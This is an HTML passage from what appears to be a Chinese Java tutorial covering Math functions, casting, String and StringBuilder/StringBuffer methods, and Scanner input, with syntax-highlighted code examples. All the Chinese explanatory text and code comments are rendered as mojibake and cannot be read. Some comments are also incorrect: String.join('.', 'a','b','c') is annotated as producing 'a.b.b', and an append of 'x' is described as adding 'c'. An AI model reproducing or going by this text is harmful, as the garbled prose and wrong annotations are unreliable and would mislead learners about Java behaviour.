punctuation">&#125;</span></code></pre><p>Â¶ÇÊûú‰∏Ä‰∏™Â∏∏ÈáèË¢´Â£∞Êòé‰∏∫<code>public</code>ÔºåÈÇ£‰πàÂÖ∂‰ªñÁ±ªÁöÑÊñπÊ≥ï‰πüÂèØ‰ª•‰ΩøÁî®Ëøô‰∏™Â∏∏Èáè„ÄÇ</p><p><strong>Êûö‰∏æ</strong></p><p>Êûö‰∏æÁ±ªÂûãÂåÖÊã¨ÊúâÈôê‰∏™ÂëΩÂêçÁöÑÂÄº„ÄÇ</p><p>ÂΩìÂèÇ‰∏é<code>/</code>ËøêÁÆóÁöÑ‰∏§‰∏™Êìç‰ΩúÊï∞ÈÉΩÊòØÊï¥Êï∞Êó∂ÔºåË°®Á§∫Êï¥Êï∞Èô§Ê≥ïÔºåÂê¶ÂàôË°®Á§∫ÊµÆÁÇπÈô§Ê≥ï„ÄÇ</p><p>Êï¥Êï∞Ë¢´0Èô§‰ºö‰∫ßÁîü‰∏Ä‰∏™ÂºÇÂ∏∏ÔºåËÄåÊµÆÁÇπÊï∞Ë¢´0Èô§Â∞Ü‰ºöÂæóÂà∞Êó†Á©∑Â§ßÊàñNANÁªìÊûú„ÄÇ</p><p>MathÁ±ªÂåÖÂê´‰∫ÜÂêÑÁßçÂêÑÊ†∑ÁöÑÊï∞Â≠¶ÂáΩÊï∞Ôºö</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">double</span> x <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span><span class="token keyword">double</span> y <span class="token operator">=</span> <span class="token class-name">Math</span><span class="token punctuation">.</span><span class="token function">sqrt</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>JavaÊ≤°ÊúâÂπÇËøêÁÆóÔºåÈúÄË¶ÅÁªìÊûúMath.powÊñπÊ≥ïÔºö<code>double y = Math.pow(x,a);</code>„ÄÇpowÊñπÊ≥ïÊúâ2‰∏™doubleÁ±ªÂûãÂèÇÊï∞ÔºåËøîÂõûÁªìÊûú‰πüÊòØdoubleÁ±ªÂûã„ÄÇ</p><p>Ê≠§Â§ñËøòÊúâ2‰∏™ÊúÄÊé•ËøëÁöÑËøë‰ººÂÄºÔºö<code>Math.PI</code>Âíå<code>Math.E</code>Êù•Ë°®Á§∫œÄÂíåe„ÄÇ</p><p>ÈùôÊÄÅÂØºÂÖ•Ôºö<code>import static java.lang.Math.*</code></p><p>Âº∫Âà∂Á±ªÂûãËΩ¨Êç¢ÊòØÂú®ÂúÜÊã¨Âè∑‰∏≠ÁªôÂá∫ÊÉ≥Ë¶ÅËΩ¨Êç¢ÁöÑÁõÆÊ†áÁ±ªÂûãÔºåÂêéÈù¢Á¥ßË∑üÂæÖËΩ¨Êç¢ÁöÑÂèòÈáèÂêçÔºö</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">double</span> x <span class="token operator">=</span> <span class="token number">9.997</span><span class="token punctuation">;</span><span class="token keyword">int</span> nx <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span> <span class="token class-name">Math</span><span class="token punctuation">.</span><span class="token function">round</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h5 id="Â≠óÁ¨¶‰∏≤"><a href="#Â≠óÁ¨¶‰∏≤" class="headerlink" title="Â≠óÁ¨¶‰∏≤"></a><strong>Â≠óÁ¨¶‰∏≤</strong></h5><p>JavaÊ≤°ÊúâÂÜÖÁΩÆÁöÑÂ≠óÁ¨¶‰∏≤Á±ªÂûãÔºåËÄåÊòØÂú®Ê†áÂáÜJavaÁ±ªÂ∫ì‰∏≠Êèê‰æõ‰∫Ü‰∏Ä‰∏™È¢ÑÂÆö‰πâÁ±ªÔºåÂè´ÂÅöString„ÄÇÊØè‰∏™Áî®ÂèåÂºïÂè∑Êã¨Ëµ∑Êù•ÁöÑÂ≠óÁ¨¶‰∏≤ÈÉΩÊòØStringÁ±ªÁöÑ‰∏Ä‰∏™ÂÆû‰æã„ÄÇ</p><p>Áî®substringÊñπÊ≥ïÊèêÂèñÂ≠ó‰∏≤</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">String</span> feng <span class="token operator">=</span> <span class="token string">"hello,world"</span><span class="token punctuation">;</span><span class="token class-name">String</span> s <span class="token operator">=</span> feng<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// "l"</span></code></pre><p>JavaËØ≠Ë®ÄÂÖÅËÆ∏Áî®<code>+</code>Âè∑ÊãºÊé•Â≠óÁ¨¶‰∏≤„ÄÇ</p><p>ÂΩì‰∏Ä‰∏™Â≠óÁ¨¶‰∏≤‰∏é‰∏Ä‰∏™ÈùûÂ≠óÁ¨¶‰∏≤ÁöÑÂÄºËøõË°åÊãºÊé•Êó∂ÔºåÂêéËÄÖ‰ºöËΩ¨Êç¢ÊàêÂ≠óÁ¨¶‰∏≤„ÄÇ</p><p>ÊääÂ§ö‰∏™Â≠óÁ¨¶‰∏≤Êîæ‰∏ÄËµ∑ÔºåÁî®‰∏Ä‰∏™ÁïåÂÆöÁ¨¶ÂàÜÂâ≤ÔºåÁî®ÈùôÊÄÅÊñπÊ≥ïjoinÔºö</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">String</span> s <span class="token operator">=</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token punctuation">,</span><span class="token string">"b"</span><span class="token punctuation">,</span><span class="token string">"c"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// a.b.b</span></code></pre><p><strong>StringÁ±ªÊ≤°ÊúâÊèê‰æõ‰øÆÊîπÂ≠óÁ¨¶‰∏≤‰∏≠Êüê‰∏™Â≠óÁ¨¶ÁöÑÊñπÊ≥ï„ÄÇ</strong>ÂèØ‰ª•ÊèêÂèñÊÉ≥Ë¶Å‰øùÁïôÁöÑÂ≠ó‰∏≤ÔºåÂÜç‰∏éÂ∏åÊúõÊõøÊç¢ÁöÑÂ≠óÁ¨¶ÊãºÊé•„ÄÇ</p><p>Áî±‰∫é‰∏çËÉΩ‰øÆÊîπJavaÂ≠óÁ¨¶‰∏≤‰∏≠ÁöÑÂçï‰∏™Â≠óÁ¨¶ÔºåÊâÄ‰ª•Âú®JavaÊñáÊ°£‰∏≠Â∞ÜStringÁ±ªÂØπË±°Áß∞‰∏∫ÊòØ‰∏çÂèØÂèòÁöÑ„ÄÇ</p><p><strong>ÂèØ‰ª•‰ΩøÁî®equalsÊñπÊ≥ïÊ£ÄÊµã‰∏§‰∏™Â≠óÁ¨¶‰∏≤ÊòØÂê¶Áõ∏Á≠â</strong>„ÄÇ‰∏çÂå∫ÂàÜÂ§ßÂ∞èÂÜôÂèØ‰ª•Áî®<code>equalsIgnoreCase</code>„ÄÇ</p><p>‰∏çË¶Å‰ΩøÁî®<code>==</code>Ê£ÄÊµã‰∏§‰∏™Â≠óÁ¨¶‰∏≤ÊòØÂê¶Áõ∏Á≠â„ÄÇÂÆÉÂè™ËÉΩÁ°ÆÂÆö‰∏§‰∏™Â≠óÁ¨¶‰∏≤ÊòØÂê¶Â≠òÊîæÂú®Âêå‰∏Ä‰ΩçÁΩÆ‰∏ä„ÄÇ</p><p>Á©∫Â≠óÁ¨¶‰∏≤ÊòØÈïøÂ∫¶‰∏∫0ÁöÑÂ≠óÁ¨¶‰∏≤ÔºåÊ£ÄÊü•ÊñπÂºèÔºö</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">if</span><span class="token punctuation">(</span>str<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token keyword">if</span><span class="token punctuation">(</span>str<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>Ê£ÄÊü•‰∏Ä‰∏™Â≠óÁ¨¶‰∏≤ÊòØÂê¶ÊòØnullÔºö</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">if</span><span class="token punctuation">(</span>str<span class="token operator">==</span><span class="token keyword">null</span><span class="token punctuation">)</span></code></pre><p>lengthÊñπÊ≥ïÂ∞ÜËøîÂõûÈááÁî®UTF-16ÁºñÁ†ÅË°®Á§∫ÁªôÂÆöÂ≠óÁ¨¶‰∏≤ÊâÄÈúÄË¶ÅÁöÑ‰ª£Á†ÅÂçïÂÖÉÊï∞Èáè„ÄÇ</p><p>ÊØèÊ¨°ÊãºÊé•Â≠óÁ¨¶‰∏≤ÁöÑÊó∂ÂÄôÔºåÈÉΩ‰ºöÊûÑÂª∫‰∏Ä‰∏™Êñ∞ÁöÑStringÂØπË±°ÔºåÂç≥ËÄóÊó∂ÔºåÂèàÊµ™Ë¥πÁ©∫Èó¥„ÄÇ‰ΩøÁî®StringBuilderÁ±ª„ÄÇ</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">StringBuilder</span> s <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>s<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"a"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>s<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"b"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">String</span> completedString <span class="token operator">=</span> s<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>completedString<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>Âú®‰ΩøÁî® StringBuffer Á±ªÊó∂ÔºåÊØèÊ¨°ÈÉΩ‰ºöÂØπ StringBuffer ÂØπË±°Êú¨Ë∫´ËøõË°åÊìç‰ΩúÔºåËÄå‰∏çÊòØÁîüÊàêÊñ∞ÁöÑÂØπË±°ÔºåÊâÄ‰ª•Â¶ÇÊûúÈúÄË¶ÅÂØπÂ≠óÁ¨¶‰∏≤ËøõË°å‰øÆÊîπÊé®Ëçê‰ΩøÁî® StringBuffer„ÄÇ</p><p>StringBuilder Á±ªÂú® Java 5 ‰∏≠Ë¢´ÊèêÂá∫ÔºåÂÆÉÂíå StringBuffer ‰πãÈó¥ÁöÑÊúÄÂ§ß‰∏çÂêåÂú®‰∫é StringBuilder ÁöÑÊñπÊ≥ï‰∏çÊòØÁ∫øÁ®ãÂÆâÂÖ®ÁöÑÔºà‰∏çËÉΩÂêåÊ≠•ËÆøÈóÆÔºâ„ÄÇ</p><p>Áî±‰∫é StringBuilder Áõ∏ËæÉ‰∫é StringBuffer ÊúâÈÄüÂ∫¶‰ºòÂäøÔºåÊâÄ‰ª•Â§öÊï∞ÊÉÖÂÜµ‰∏ãÂª∫ËÆÆ‰ΩøÁî® StringBuilder Á±ª„ÄÇ</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Study</span> <span class="token punctuation">&#123;</span><span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//ÈáçÂÜôObjectÁ±ª‰∏≠toString()ÊñπÊ≥ï</span><span class="token keyword">return</span> <span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token class-name">StringBuffer</span> s1<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">StringBuffer</span><span class="token punctuation">(</span><span class="token string">"abcd1234!?,;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">StringBuffer</span> s2<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">StringBuffer</span><span class="token punctuation">(</span><span class="token string">"987654321987654"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">StringBuffer</span> s3<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">StringBuffer</span><span class="token punctuation">(</span><span class="token string">"987654321"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"‚Üì‚Üì‚ÜìStringBufferÁ±ªÁöÑ‰∏Ä‰∫õÂ∏∏Áî®ÊñπÊ≥ïÂ¶Ç‰∏ã‚Üì‚Üì‚Üì"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"-----------------------------------------------------"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Â≠óÁ¨¶‰∏≤s1ÁöÑÈïøÂ∫¶‰∏∫Ôºö"</span> <span class="token operator">+</span> s1<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//ËøîÂõûÂ≠óÁ¨¶‰∏≤ÁöÑÂÆûÈôÖÈïøÂ∫¶</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"-----------------------------------------------------"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Â≠óÁ¨¶‰∏≤s1ÊâÄÂç†ÂÆπÂô®ÁöÑÂ§ßÂ∞è‰∏∫Ôºö"</span> <span class="token operator">+</span> s1<span class="token punctuation">.</span><span class="token function">capacity</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//ËøîÂõûÂ≠óÁ¨¶‰∏≤ÊâÄÂç†ÂÆπÂô®ÁöÑÊÄªÂ§ßÂ∞è</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"-----------------------------------------------------"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Ëé∑ÂèñÂ≠óÁ¨¶‰∏≤s1‰∏≠Á¨¨2‰∏™‰ΩçÁΩÆÁöÑÂ≠óÁ¨¶Ôºö"</span> <span class="token operator">+</span> s1<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"-----------------------------------------------------"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Â≠êÂ≠óÁ¨¶‰∏≤'654'Á¨¨‰∏ÄÊ¨°Âá∫Áé∞Âú®Â≠óÁ¨¶‰∏≤s2‰∏≠ÁöÑÁ¥¢Âºï‰∏∫Ôºö"</span> <span class="token operator">+</span> s2<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">"654"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"‰ªéÊåáÂÆöÁöÑÁ¥¢Âºï6ÂºÄÂßãÊêúÁ¥¢ÔºåËøîÂõûÂ≠êÂ≠óÁ¨¶‰∏≤'654'Á¨¨‰∏ÄÊ¨°Âá∫Áé∞Âú®Â≠óÁ¨¶‰∏≤s2‰∏≠ÁöÑÁ¥¢ÂºïÔºö"</span> <span class="token operator">+</span> s2<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">"654"</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"-----------------------------------------------------"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Â≠êÂ≠óÁ¨¶‰∏≤'987'ÊúÄÂêé‰∏ÄÊ¨°Âá∫Áé∞Âú®Â≠óÁ¨¶‰∏≤s2‰∏≠ÁöÑÁ¥¢Âºï‰∏∫Ôºö"</span> <span class="token operator">+</span> s2<span class="token punctuation">.</span><span class="token function">lastIndexOf</span><span class="token punctuation">(</span><span class="token string">"987"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"‰ªéÊåáÂÆöÁöÑÁ¥¢Âºï5ÂºÄÂßãÂèçÂêëÊêúÁ¥¢ÔºåËøîÂõûÂ≠óÁ¨¶‰∏≤'87'Âú®Â≠óÁ¨¶‰∏≤s2‰∏≠ÊúÄÂêé‰∏ÄÊ¨°Âá∫Áé∞ÁöÑÁ¥¢ÂºïÔºö"</span> <span class="token operator">+</span> s2<span class="token punctuation">.</span><span class="token function">lastIndexOf</span><span class="token punctuation">(</span><span class="token string">"87"</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"-----------------------------------------------------"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>s1<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token char">'x'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//Âú®Â≠óÁ¨¶‰∏≤s1ÁöÑÊú´Â∞æÊ∑ªÂä†Â≠óÁ¨¶'c'</span>s1<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"Java"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//Âú®Â≠óÁ¨¶‰∏≤s1ÁöÑÊú´Â∞æÊ∑ªÂä†Â≠óÁ¨¶‰∏≤"Java"</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"‰øÆÊîπÂêéÁöÑÂ≠óÁ¨¶‰∏≤s1‰∏∫Ôºö"</span> <span class="token operator">+</span> s1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"-----------------------------------------------------"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>s1<span class="token punctuation">.</span><span class="token function">insert</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token string">"abcd"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//Âú®Á¨¨4‰∏™‰ΩçÁΩÆÊèíÂÖ•Â≠óÁ¨¶‰∏≤"abcd"</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"‰øÆÊîπÂêéÁöÑÂ≠óÁ¨¶‰∏≤s1‰∏∫Ôºö"</span> <span class="token operator">+</span> s1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"-----------------------------------------------------"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>s1<span class="token punctuation">.</span><span class="token function">deleteCharAt</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//Âà†Èô§Â≠óÁ¨¶‰∏≤s1‰∏≠Á¨¨‰∏Ä‰∏™‰ΩçÁΩÆÁöÑÂ≠óÁ¨¶</span>s1<span class="token punctuation">.</span><span class="token function">delete</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//Âà†Èô§Â≠óÁ¨¶‰∏≤s1‰∏≠Á¨¨2Âà∞Á¨¨4‰∏™‰ΩçÁΩÆÁöÑÂ≠óÁ¨¶</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"‰øÆÊîπÂêéÁöÑÂ≠óÁ¨¶‰∏≤s1‰∏∫Ôºö"</span> <span class="token operator">+</span> s1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"-----------------------------------------------------"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>s1<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">"5678"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//Â∞ÜÂ≠óÁ¨¶‰∏≤s1‰∏≠Á¨¨4Âà∞Á¨¨7‰∏™‰ΩçÁΩÆÁöÑÂ≠óÁ¨¶‰∏≤‰øÆÊîπ‰∏∫"5678"</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"‰øÆÊîπÂêéÁöÑÂ≠óÁ¨¶‰∏≤s1‰∏∫Ôºö"</span> <span class="token operator">+</span> s1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"-----------------------------------------------------"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>s1<span class="token punctuation">.</span><span class="token function">setCharAt</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token char">'b'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//Â∞ÜÂ≠óÁ¨¶‰∏≤s1‰∏≠Á¨¨‰∏Ä‰∏™‰ΩçÁΩÆÁöÑÂ≠óÁ¨¶‰øÆÊîπ‰∏∫'b'</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"‰øÆÊîπÂêéÁöÑÂ≠óÁ¨¶‰∏≤s1‰∏∫Ôºö"</span> <span class="token operator">+</span> s1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"-----------------------------------------------------"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>s2<span class="token punctuation">.</span><span class="token function">reverse</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//Â∞ÜÂ≠óÁ¨¶‰∏≤s2ÂèçËΩ¨</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"‰øÆÊîπÂêéÁöÑÂ≠óÁ¨¶‰∏≤s2‰∏∫Ôºö"</span> <span class="token operator">+</span> s2<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"-----------------------------------------------------"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Êà™ÂèñÂ≠óÁ¨¶‰∏≤s1‰ªéÁ¨¨4‰∏™‰ΩçÁΩÆÂºÄÂßãÂà∞ÁªìÂ∞æÔºö"</span> <span class="token operator">+</span> s1<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"-----------------------------------------------------"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Êà™ÂèñÂ≠óÁ¨¶‰∏≤s1‰ªéÁ¨¨4‰∏™‰ΩçÁΩÆÂºÄÂßãÂà∞Á¨¨7‰∏™‰ΩçÁΩÆÁªìÂ∞æÔºö"</span> <span class="token operator">+</span> s1<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"-----------------------------------------------------"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Ëé∑Âèñs1ÁöÑÂèòÈáèÁ±ªÂûãÔºö"</span> <span class="token operator">+</span> s1<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Â∞ÜÂØπË±°‰ø°ÊÅØËΩ¨Âåñ‰∏∫Â≠óÁ¨¶‰∏≤Ôºö"</span> <span class="token operator">+</span> s2<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>ËØªÂèñËæìÂÖ•Ôºö</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Scanner</span> in <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Scanner</span><span class="token punctuation">(</span><span class="token class-name">System</span><span class="token punctuation">.</span>in<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">String</span> s1 <span class="token operator">=</span> in<span class="token punctuation">.</span><span class="token function">nextLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//ËØªÂèñ‰∏ÄË°åËæìÂÖ•</span><span class="token class-name">String</span> s2 <span class="token operator">=</span> in<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//ËØªÂèñ‰∏Ä‰∏™ÂçïËØçÔºå‰ª•Á©∫ÁôΩÁ¨¶‰Ωú‰∏∫ÂàÜÂâ≤„ÄÇ</span><span class="token keyword">int</span> age <span class="token operator">=</span> in<span class="token punctuation">.</span><span class="token function">nextInt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//ËØªÂèñ‰∏Ä‰∏™Êï¥Êï∞</span><span class="token keyword">double</span> feng <span class="token operator">=</span> in<span class="token punctuation">.</span><span class="token function">nextDouble</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>s1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token 